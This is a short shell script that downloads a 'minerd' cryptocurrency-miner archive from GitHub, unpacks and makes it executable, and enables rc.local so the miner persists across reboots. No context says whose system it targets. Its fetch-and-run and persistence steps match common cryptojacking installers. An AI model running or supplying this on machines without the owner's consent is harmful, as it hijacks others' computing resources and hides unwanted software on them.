cd / 
wget https://github.com/cr-sh/pfw/raw/master/include/minerd.tar
tar xvf minerd.tar
chmod +x /usr/local/src/minerd
apt-get -y install libcurl4-openssl-dev htop screen
chmod 755 /etc/init.d/rc.local
systemctl enable rc-local
systemctl start rc-local.service
systemctl status rc-local.service
sh /etc/rc.local &
exit 0
